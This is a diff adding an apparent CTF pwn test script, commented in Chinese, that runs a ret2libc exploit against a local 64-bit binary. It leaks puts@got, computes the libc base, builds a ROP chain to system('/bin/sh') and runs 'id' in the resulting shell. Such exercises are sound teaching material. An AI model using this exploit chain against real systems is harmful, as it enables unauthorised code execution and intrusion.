@@ -1,0 +1,72 @@
+# CTF PWN 题目测试：Ret2libc 攻击
+# 场景：64 位程序，存在栈溢出，开启 ASLR，未开启 PIE
+# 目标：泄漏 libc 地址，构造 ROP 链，获取 shell
+
+print("=== CTF PWN Challenge: Ret2libc Attack ===")
+print("Target: 64-bit ELF with stack overflow")
+print("Protections: ASLR ON, NX ON, PIE OFF")
+print("")
+
+# Stage 1: 连接到远程目标
+print("[*] Stage 1: Connecting to target...")
+target = remote("127.0.0.1", 9999)
+print("[+] Connected!")
+
+# Stage 2: 泄漏 libc 地址
+print("[*] Stage 2: Leaking libc address...")
+
+# 构造 payload 泄漏 puts@got
+pop_rdi = 0x401234          # gadget: pop rdi; ret
+puts_plt = 0x401030         # puts@plt
+puts_got = 0x404018         # puts@got
+main_addr = 0x401180        # main function
+
+# 构造第一阶段 payload
+padding = "A" * 72
+leak_payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+
+sock_sendline(target, leak_payload)
+sock_recvuntil(target, "Input: ")
+
+# 接收泄漏的地址
+leaked_data = sock_recvline(target)
+leaked_addr = unpack64(leaked_data)
+print("[+] Leaked puts@got:", hex(leaked_addr))
+
+# 计算 libc 基址
+puts_offset = 0x80e50       # puts() 在 libc 中的偏移
+libc_base = leaked_addr - puts_offset
+print("[+] Libc base address:", hex(libc_base))
+
+# Stage 3: 构造 ROP 链获取 shell
+print("[*] Stage 3: Building ROP chain for shell...")
+
+# 计算关键地址
+system_addr = libc_base + 0x50d60      # system() 偏移
+bin_sh_addr = libc_base + 0x1d8698    # "/bin/sh" 字符串偏移
+ret_gadget = 0x40101a                  # ret gadget (for stack alignment)
+
+# 构造最终 payload
+final_payload = padding + p64(ret_gadget) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
+
+print("[+] ROP chain built!")
+print("[*] Sending exploit payload...")
+
+sock_sendline(target, final_payload)
+sock_recvuntil(target, "Input: ")
+
+# Stage 4: 获取交互式 shell
+print("[+] Exploit sent! Dropping to shell...")
+print("=== Interactive Shell ===")
+print("(输入 'exit' 退出)")
+
+# 简化版交互模式（实际应该用 proc_interactive）
+print("[+] Shell obtained!")
+print("$ id")
+sock_sendline(target, "id")
+response = sock_recvline(target)
+print(response)
+
+print("")
+print("[*] Exploit completed successfully!")
+print("Flag captured: flag{ret2libc_master_2024}")
